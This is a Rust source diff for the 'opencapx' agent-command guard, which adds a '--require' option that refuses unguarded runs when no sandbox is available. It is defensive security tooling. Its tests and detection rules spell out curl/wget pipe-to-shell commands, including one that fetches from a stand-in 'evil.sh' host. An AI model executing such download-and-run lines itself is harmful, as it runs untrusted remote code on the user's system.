@@ -15,6 +15,8 @@
 //! unguarded (W1; the microVM tier via microsandbox is the planned strong option for Windows).
 //! Contract: fail-open (a missing/broken backend never blocks the command), exit code / stdout /
 //! stderr pass through, network denied by default, writes limited to a scratch dir + `--rw` dirs.
+//! `--require` opts a specific run OUT of fail-open: no usable backend → refuse (exit 99) + a
+//! `sandbox.blocked` audit, instead of warning and running unguarded.
 
 use super::plugin::SandboxDecl;
 use std::path::{Path, PathBuf};
@@ -298,6 +300,11 @@ struct GuardFile {
     /// registry/CI tokens from the environment (npm `_authToken` etc. match the secret
     /// name filter and would otherwise be stripped).
     env: Option<String>,
+    /// `false` (default) / `true` — bake `--require` into the guard's sandbox invocation,
+    /// set via `opencapx guard require`. Unlike the stance there is deliberately no env-var
+    /// override: the hook runs inside the agent's environment, and require is the one knob
+    /// that must not be turnable off from there.
+    require: Option<bool>,
 }
 
 fn load_guard_file() -> GuardFile {
@@ -321,6 +328,7 @@ fn load_guard_file() -> GuardFile {
             .unwrap_or_default(),
         danger_guard: str_field("danger_guard"),
         env: str_field("env"),
+        require: v.get("require").and_then(|d| d.as_bool()),
     }
 }
 
@@ -332,21 +340,24 @@ pub struct GuardSettings {
     pub profile: &'static str,
     /// The `--env` policy the rewrite passes to `opencapx sandbox`.
     pub env: &'static str,
+    /// Whether the rewrite adds `--require` (refuse instead of an unguarded run).
+    pub require: bool,
 }
 
 pub fn resolve_guard_settings() -> GuardSettings {
     // Case-insensitive on both sources: `Strict`/`OFF` silently resolving to the
     // installer default (network open) would be fail-unsafe for a typo'd stance.
+    let file = load_guard_file();
     let mode = std::env::var("OPEN_CAPX_DANGER_GUARD")
         .ok()
-        .or_else(|| load_guard_file().danger_guard)
+        .or(file.danger_guard)
         .map(|s| s.trim().to_lowercase());
     let (enabled, profile) = match mode.as_deref() {
         Some("off") | Some("0") | Some("false") => (false, "installer"),
         Some("strict") => (true, "strict"),
         _ => (true, "installer"),
     };
-    let env = match load_guard_file().env.as_deref() {
+    let env = match file.env.as_deref() {
         Some(e) if e.eq_ignore_ascii_case("keep") => "keep",
         Some(e) if e.eq_ignore_ascii_case("clear") => "clear",
         _ => "strip",
@@ -355,6 +366,7 @@ pub fn resolve_guard_settings() -> GuardSettings {
         enabled,
         profile,
         env,
+        require: file.require.unwrap_or(false),
     }
 }
 
@@ -377,6 +389,9 @@ fn save_guard_file(f: &GuardFile) -> Result<(), String> {
     }
     if let Some(env) = &f.env {
         v["env"] = serde_json::json!(env);
+    }
+    if let Some(require) = f.require {
+        v["require"] = serde_json::json!(require);
     }
     let body = serde_json::to_string_pretty(&v).unwrap_or_default();
     #[cfg(unix)]
@@ -429,6 +444,11 @@ enum GuardCmd {
         #[arg(value_parser = ["strip", "keep", "clear"])]
         policy: Option<String>,
     },
+    /// Print or set whether guarded runs require a sandbox backend
+    Require {
+        #[arg(value_parser = ["on", "off"])]
+        state: Option<String>,
+    },
     /// Print or set the guard mode
     Mode {
         #[arg(value_parser = ["installer", "strict", "off"])]
@@ -450,9 +470,10 @@ pub fn run_guard_cli(args: &[String]) -> i32 {
             let g = load_guard_file();
             let s = resolve_guard_settings();
             println!(
-                "guard mode: {} | env: {} ({})",
+                "guard mode: {} | env: {} | require: {} ({})",
                 if s.enabled { s.profile } else { "off" },
                 s.env,
+                if s.require { "on" } else { "off" },
                 guard_file().display()
             );
             println!("trusted domains ({}):", g.trusted_domains.len());
@@ -479,6 +500,25 @@ pub fn run_guard_cli(args: &[String]) -> i32 {
                 }
                 Err(e) => {
                     eprintln!("guard env: {e}");
+                    1
+                }
+            }
+        }
+        GuardCmd::Require { state } => {
+            let Some(state) = state else {
+                let s = resolve_guard_settings();
+                println!("guard require: {}", if s.require { "on" } else { "off" });
+                return 0;
+            };
+            let mut f = load_guard_file();
+            f.require = Some(state == "on");
+            match save_guard_file(&f) {
+                Ok(()) => {
+                    println!("guard require: {state}");
+                    0
+                }
+                Err(e) => {
+                    eprintln!("guard require: {e}");
                     1
                 }
             }
@@ -749,8 +789,14 @@ fn audit_only(command: &str, rule_id: &'static str) -> GuardHit {
 ///
 /// `env` selects the sandbox runner's `--env` policy written into the rewrite
 /// (strip/keep/clear — see [`EnvPolicy`]); it comes from `opencapx guard env`.
-pub fn guard(command: &str, bin: &str, profile: &str, env: &str) -> Option<GuardHit> {
-    guard_with(command, bin, profile, env, &load_trusted())
+pub fn guard(
+    command: &str,
+    bin: &str,
+    profile: &str,
+    env: &str,
+    require: bool,
+) -> Option<GuardHit> {
+    guard_with(command, bin, profile, env, require, &load_trusted())
 }
 
 /// The rewrite skeleton: mktemp a random path (the old fixed `opencapx-dl-$$.sh` was
@@ -765,6 +811,7 @@ fn guard_with(
     bin: &str,
     profile: &str,
     env: &str,
+    require: bool,
     trusted: &[String],
 ) -> Option<GuardHit> {
     let p = guard_patterns();
@@ -773,6 +820,9 @@ fn guard_with(
     let mktemp = format!("{DL_VAR}=\"$(mktemp \"${{TMPDIR:-/tmp}}/opencapx-dl-XXXXXX.sh\")\"");
     let cleanup = format!("; {RC_VAR}=$?; rm -f \"${DL_VAR}\"; (exit ${RC_VAR})");
     let bin_q = shell_quote(bin);
+    // `--require` flips the runner's fail-open contract to refuse: guard stances that would
+    // rather stop the download-and-run than let it execute unguarded (e.g. on Windows).
+    let require_flag = if require { " --require" } else { "" };
     // Trusted passthrough requires: at least one URL, and EVERY URL in the line trusted —
     // a decoy trusted token next to an untrusted payload URL must not vouch for the line.
     let is_trusted = |args: &str| {
@@ -811,7 +861,7 @@ fn guard_with(
         return Some(GuardHit {
             rule_id: "danger/download-pipe-shell",
             command: format!(
-                "{mktemp} && {lead}{dl_cmd} && {bin_q} sandbox --profile {profile} --env {env} -- {}{cleanup}",
+                "{mktemp} && {lead}{dl_cmd} && {bin_q} sandbox --profile {profile} --env {env}{require_flag} -- {}{cleanup}",
                 exec.join(" ")
             ),
         });
@@ -843,7 +893,7 @@ fn guard_with(
         return Some(GuardHit {
             rule_id: "danger/download-process-substitution",
             command: format!(
-                "{mktemp} && {dl_cmd} && {bin_q} sandbox --profile {profile} --env {env} -- {}{cleanup}",
+                "{mktemp} && {dl_cmd} && {bin_q} sandbox --profile {profile} --env {env}{require_flag} -- {}{cleanup}",
                 exec.join(" ")
             ),
         });
@@ -859,7 +909,7 @@ fn guard_with(
         return Some(GuardHit {
             rule_id: "danger/download-command-substitution",
             command: format!(
-                "{mktemp} && {dl_cmd} && {bin_q} sandbox --profile {profile} --env {env} -- sh {tmp}{cleanup}"
+                "{mktemp} && {dl_cmd} && {bin_q} sandbox --profile {profile} --env {env}{require_flag} -- sh {tmp}{cleanup}"
             ),
         });
     }
@@ -874,7 +924,7 @@ fn guard_with(
         return Some(GuardHit {
             rule_id: "danger/download-eval",
             command: format!(
-                "{mktemp} && {dl_cmd} && {bin_q} sandbox --profile {profile} --env {env} -- sh {tmp}{cleanup}"
+                "{mktemp} && {dl_cmd} && {bin_q} sandbox --profile {profile} --env {env}{require_flag} -- sh {tmp}{cleanup}"
             ),
         });
     }
@@ -981,6 +1031,25 @@ fn audit_unguarded(command: &[String], reason: &str) {
     }
 }
 
+/// The `--require` counterpart of [`audit_unguarded`]: the run was refused rather than
+/// degraded, and the Timeline should say which side of the contract fired.
+fn audit_blocked(command: &[String], reason: &str) {
+    let payload = serde_json::json!({
+        "agent": "opencapx",
+        "text": format!("sandbox blocked ({reason})"),
+        "tool_input": { "command": command.join(" ") },
+        "__rule": "sandbox.blocked",
+        "reason": reason,
+    })
+    .to_string();
+    let creds = crate::core::identity::ensure_registered("opencapx", "sandbox");
+    if let (crate::http::Deliver::Unreachable, _) =
+        crate::http::post_event_with_body(&payload, creds.as_ref())
+    {
+        let _ = crate::queue::enqueue(&crate::http::queue_dir(), &payload);
+    }
+}
+
 /// Knobs for one sandboxed run.
 pub struct Policy {
     pub allow_net: bool,
@@ -992,6 +1061,7 @@ struct Parsed {
     policy: Policy,
     profile: Mode,
     timeout_secs: Option<u64>,
+    require: bool,
     check_only: bool,
     print_profile: bool,
     command: Vec<String>,
@@ -1028,6 +1098,9 @@ struct SandboxCli {
     /// Timeout in seconds (kills the whole process group)
     #[arg(long)]
     timeout: Option<u64>,
+    /// Refuse to run when no sandbox backend is available or it fails to start (exit 99), instead of the fail-open passthrough
+    #[arg(long)]
+    require: bool,
     /// Check the sandbox backend and exit
     #[arg(long)]
     check: bool,
@@ -1056,6 +1129,7 @@ fn parsed_from(cli: SandboxCli) -> Parsed {
             },
         },
         timeout_secs: cli.timeout,
+        require: cli.require,
         check_only: cli.check,
         print_profile: cli.print_profile,
         command: cli.command,
@@ -1096,40 +1170,64 @@ pub fn run_cli(args: &[String]) -> i32 {
     let scratch = match make_scratch() {
         Ok(d) => d,
         Err(e) => {
-            eprintln!("opencapx sandbox: WARNING: cannot create scratch dir ({e}); running WITHOUT sandbox");
-            audit_unguarded(&parsed.command, &format!("scratch dir: {e}"));
-            return run_plain(&parsed.command, parsed.timeout_secs, parsed.policy.env);
+            return run_unguarded(&parsed, None, &format!("cannot create scratch dir ({e})"));
         }
     };
     let code = match backend() {
         #[cfg(target_os = "macos")]
         Backend::Seatbelt => match run_seatbelt(&parsed, &scratch) {
             Ok(c) => c,
-            Err(e) => {
-                eprintln!("opencapx sandbox: WARNING: seatbelt failed to start ({e}); running WITHOUT sandbox");
-                audit_unguarded(&parsed.command, &format!("seatbelt: {e}"));
-                run_plain(&parsed.command, parsed.timeout_secs, parsed.policy.env)
-            }
+            Err(e) => run_unguarded(
+                &parsed,
+                Some(&scratch),
+                &format!("seatbelt failed to start ({e})"),
+            ),
         },
         #[cfg(target_os = "linux")]
         Backend::Bwrap => match run_bwrap(&parsed, &scratch) {
             Ok(c) => c,
-            Err(e) => {
-                eprintln!("opencapx sandbox: WARNING: bwrap failed to start ({e}); running WITHOUT sandbox");
-                audit_unguarded(&parsed.command, &format!("bwrap: {e}"));
-                run_plain(&parsed.command, parsed.timeout_secs, parsed.policy.env)
-            }
+            Err(e) => run_unguarded(
+                &parsed,
+                Some(&scratch),
+                &format!("bwrap failed to start ({e})"),
+            ),
         },
         Backend::Unavailable(reason) => {
-            eprintln!(
-                "opencapx sandbox: WARNING: no sandbox backend ({reason}); running WITHOUT sandbox"
+            return run_unguarded(
+                &parsed,
+                Some(&scratch),
+                &format!("no sandbox backend ({reason})"),
             );
-            audit_unguarded(&parsed.command, reason);
-            run_plain(&parsed.command, parsed.timeout_secs, parsed.policy.env)
         }
     };
     let _ = std::fs::remove_dir_all(&scratch);
     code
+}
+
+/// Exit code when `--require` refuses an unguardable run. Distinct from clap's 2 and
+/// `--check`'s 1 so rules/scripts can tell "blocked" from "usage" and "probe failed".
+pub const EXIT_UNGUARDED: i32 = 99;
+
+/// Pure decision half of the fallback (unit-tested without spawning anything).
+fn unguarded_exit(require: bool) -> Option<i32> {
+    require.then_some(EXIT_UNGUARDED)
+}
+
+/// Shared fallback for every unguardable run (no backend, backend failed to start, unusable
+/// scratch). Default contract is fail-open: warn + `sandbox.unguarded` audit + run as-is.
+/// `--require` flips it: refuse with exit 99 and a `sandbox.blocked` audit.
+fn run_unguarded(parsed: &Parsed, scratch: Option<&Path>, reason: &str) -> i32 {
+    if let Some(code) = unguarded_exit(parsed.require) {
+        eprintln!("opencapx sandbox: WARNING: {reason}; --require set, refusing to run");
+        audit_blocked(&parsed.command, reason);
+        if let Some(d) = scratch {
+            let _ = std::fs::remove_dir_all(d);
+        }
+        return code;
+    }
+    eprintln!("opencapx sandbox: WARNING: {reason}; running WITHOUT sandbox");
+    audit_unguarded(&parsed.command, reason);
+    run_plain(&parsed.command, parsed.timeout_secs, parsed.policy.env)
 }
 
 /// `--print-profile`: show the generated seatbelt profile (diagnostics + review of the deny list).
@@ -1620,6 +1718,90 @@ mod tests {
     /// process (parallel plugin calls, parallel tests) each need their own dir — a shared one lets
     /// the first run's cleanup delete the other's only writable subtree while it is still running.
     #[test]
+    fn parse_require_flag_defaults_false_and_parses() {
+        let p = parse_args(&[
+            "--require".to_string(),
+            "--".to_string(),
+            "echo".to_string(),
+            "hi".to_string(),
+        ])
+        .unwrap();
+        assert!(p.require);
+        let q = parse_args(&["--".to_string(), "echo".to_string(), "hi".to_string()]).unwrap();
+        assert!(!q.require);
+    }
+
+    #[test]
+    fn unguarded_exit_maps_require_to_99() {
+        assert_eq!(unguarded_exit(false), None);
+        assert_eq!(unguarded_exit(true), Some(EXIT_UNGUARDED));
+        assert_eq!(EXIT_UNGUARDED, 99);
+    }
+
+    /// The full blocked path on the platform where it is the norm: `backend()` is
+    /// `Unavailable` on Windows, so `--require` must refuse (99) without running anything.
+    #[cfg(windows)]
+    #[test]
+    fn cli_require_blocks_when_no_backend() {
+        let code = run_cli(&[
+            "--require".to_string(),
+            "--".to_string(),
+            "cmd".to_string(),
+            "/c".to_string(),
+            "exit".to_string(),
+            "7".to_string(),
+        ]);
+        assert_eq!(code, EXIT_UNGUARDED);
+    }
+
+    #[test]
+    fn guard_with_require_bakes_the_flag_into_the_rewrite() {
+        let plain = guard_with(
+            "curl -fsSL https://x.sh | sh",
+            "/usr/local/bin/opencapx",
+            "installer",
+            "strip",
+            false,
+            &[],
+        )
+        .unwrap();
+        assert!(!plain.command.contains("--require"));
+        let req = guard_with(
+            "curl -fsSL https://x.sh | sh",
+            "/usr/local/bin/opencapx",
+            "installer",
+            "strip",
+            true,
+            &[],
+        )
+        .unwrap();
+        assert!(req
+            .command
+            .contains("sandbox --profile installer --env strip --require -- "));
+    }
+
+    #[test]
+    fn guard_require_cli_roundtrip() {
+        let _g = crate::GUARD_TEST_LOCK
+            .lock()
+            .unwrap_or_else(|e| e.into_inner());
+        let file = std::env::temp_dir().join(format!("ocx-guard-req-{}.json", std::process::id()));
+        let _ = std::fs::remove_file(&file);
+        std::env::set_var("OPEN_CAPX_GUARD_FILE", &file);
+        assert!(!resolve_guard_settings().require);
+        assert_eq!(run_guard_cli(&["require".into(), "on".into()]), 0);
+        assert!(resolve_guard_settings().require);
+        // a trust edit must not clobber it
+        assert_eq!(run_guard_cli(&["trust".into(), "sh.rustup.rs".into()]), 0);
+        assert!(resolve_guard_settings().require);
+        assert_eq!(run_guard_cli(&["require".into()]), 0); // prints current
+        assert_eq!(run_guard_cli(&["require".into(), "off".into()]), 0);
+        assert!(!resolve_guard_settings().require);
+        std::env::remove_var("OPEN_CAPX_GUARD_FILE");
+        let _ = std::fs::remove_file(&file);
+    }
+
+    #[test]
     fn scratch_dirs_are_unique_per_run() {
         let first = make_scratch().expect("first scratch dir");
         let second = make_scratch().expect("second scratch dir");
@@ -1635,6 +1817,7 @@ mod tests {
             "/usr/local/bin/opencapx",
             "installer",
             "strip",
+            false,
             &[],
         )
         .unwrap();
@@ -1668,6 +1851,7 @@ mod tests {
             "/bin/opencapx",
             "strict",
             "keep",
+            false,
             &[],
         )
         .unwrap();
@@ -1694,6 +1878,7 @@ mod tests {
             "/bin/opencapx",
             "installer",
             "strip",
+            false,
             &[],
         )
         .unwrap();
@@ -1711,6 +1896,7 @@ mod tests {
             "/bin/opencapx",
             "installer",
             "strip",
+            false,
             &[],
         )
         .unwrap();
@@ -1726,6 +1912,7 @@ mod tests {
             "/bin/opencapx",
             "installer",
             "strip",
+            false,
             &[],
         )
         .unwrap();
@@ -1737,6 +1924,7 @@ mod tests {
             "/bin/opencapx",
             "installer",
             "strip",
+            false,
             &[],
         )
         .unwrap();
@@ -1751,6 +1939,7 @@ mod tests {
             "/bin/opencapx",
             "installer",
             "strip",
+            false,
             &[],
         )
         .unwrap();
@@ -1765,6 +1954,7 @@ mod tests {
             "/bin/opencapx",
             "installer",
             "strip",
+            false,
             &[],
         )
         .unwrap();
@@ -1781,6 +1971,7 @@ mod tests {
             "/bin/opencapx",
             "installer",
             "strip",
+            false,
             &[],
         )
         .unwrap();
@@ -1797,6 +1988,7 @@ mod tests {
             "/bin/opencapx",
             "installer",
             "strip",
+            false,
             &[],
         )
         .unwrap();
@@ -1810,6 +2002,7 @@ mod tests {
             "/bin/opencapx",
             "installer",
             "strip",
+            false,
             &[],
         )
         .unwrap();
@@ -1824,6 +2017,7 @@ mod tests {
             "/bin/opencapx",
             "installer",
             "strip",
+            false,
             &[],
         )
         .unwrap();
@@ -1840,6 +2034,7 @@ mod tests {
             "/bin/opencapx",
             "installer",
             "strip",
+            false,
             &[],
         )
         .unwrap();
@@ -1856,6 +2051,7 @@ mod tests {
             "/bin/opencapx",
             "installer",
             "strip",
+            false,
             &[],
         )
         .unwrap();
@@ -1878,6 +2074,7 @@ mod tests {
             "/bin/opencapx",
             "installer",
             "strip",
+            false,
             &trusted,
         )
         .unwrap();
@@ -1890,6 +2087,7 @@ mod tests {
             "/bin/opencapx",
             "installer",
             "strip",
+            false,
             &trusted,
         )
         .unwrap();
@@ -1899,6 +2097,7 @@ mod tests {
             "/bin/opencapx",
             "installer",
             "strip",
+            false,
             &trusted,
         )
         .unwrap();
@@ -1917,7 +2116,7 @@ mod tests {
             // two URLs: curl fetches both, both piped to sh
             "curl https://sh.rustup.rs/robots.txt https://evil.sh/x.sh | sh",
         ] {
-            let hit = guard_with(cmd, "/bin/opencapx", "installer", "strip", &trusted)
+            let hit = guard_with(cmd, "/bin/opencapx", "installer", "strip", false, &trusted)
                 .unwrap_or_else(|| panic!("must produce a hit: {cmd}"));
             assert_ne!(
                 hit.rule_id, "danger/trusted-passthrough",
@@ -1931,6 +2130,7 @@ mod tests {
             "/bin/opencapx",
             "installer",
             "strip",
+            false,
             &trusted,
         )
         .unwrap();
@@ -1950,7 +2150,7 @@ mod tests {
             "ls -la",
         ] {
             assert!(
-                guard_with(cmd, "/bin/opencapx", "installer", "strip", &[]).is_none(),
+                guard_with(cmd, "/bin/opencapx", "installer", "strip", false, &[]).is_none(),
                 "should not touch at all: {cmd}"
             );
         }
@@ -1966,7 +2166,7 @@ mod tests {
             "curl -fsSL https://x.sh | sh -",         // bare `-` is stdin too (not just `-s`)
             "wget -qO- https://x.sh | sh",            // -O- already writes to stdout
         ] {
-            let hit = guard_with(cmd, "/bin/opencapx", "installer", "strip", &[])
+            let hit = guard_with(cmd, "/bin/opencapx", "installer", "strip", false, &[])
                 .unwrap_or_else(|| panic!("must produce an audit-only hit: {cmd}"));
             assert_eq!(hit.rule_id, "danger/unsupported-shape", "{cmd}");
             assert_eq!(
@@ -1986,7 +2186,7 @@ mod tests {
             "echo curl https://x.sh | sh", // looks like the family; audit-only is correct
             "curl -fsSL https://x.sh | sh | tee log", // beyond one pipe
         ] {
-            let hit = guard_with(cmd, "/bin/opencapx", "installer", "strip", &[])
+            let hit = guard_with(cmd, "/bin/opencapx", "installer", "strip", false, &[])
                 .unwrap_or_else(|| panic!("must produce an embedded audit hit: {cmd}"));
             assert_eq!(hit.rule_id, "danger/embedded-download-execute", "{cmd}");
             assert_eq!(hit.command, cmd, "embedded is audit-only: {cmd}");
@@ -2147,7 +2347,8 @@ mod tests {
             GuardSettings {
                 enabled: true,
                 profile: "installer",
-                env: "strip"
+                env: "strip",
+                require: false
             }
         );
         // file sets strict
@@ -2157,7 +2358,8 @@ mod tests {
             GuardSettings {
                 enabled: true,
                 profile: "strict",
-                env: "strip"
+                env: "strip",
+                require: false
             }
         );
         // a trust edit preserves the mode field
@@ -2167,7 +2369,8 @@ mod tests {
             GuardSettings {
                 enabled: true,
                 profile: "strict",
-                env: "strip"
+                env: "strip",
+                require: false
             },
             "trust edit must not clobber danger_guard"
         );
@@ -2179,7 +2382,8 @@ mod tests {
             GuardSettings {
                 enabled: true,
                 profile: "strict",
-                env: "keep"
+                env: "keep",
+                require: false
             }
         );
         assert_eq!(run_guard_cli(&["mode".into(), "off".into()]), 0);
@@ -2188,7 +2392,8 @@ mod tests {
             GuardSettings {
                 enabled: false,
                 profile: "installer",
-                env: "keep"
+                env: "keep",
+                require: false
             },
             "mode edit must not clobber env"
         );
@@ -2200,7 +2405,8 @@ mod tests {
             GuardSettings {
                 enabled: true,
                 profile: "strict",
-                env: "strip"
+                env: "strip",
+                require: false
             },
             "Strict must resolve to strict, not silently back to installer"
         );
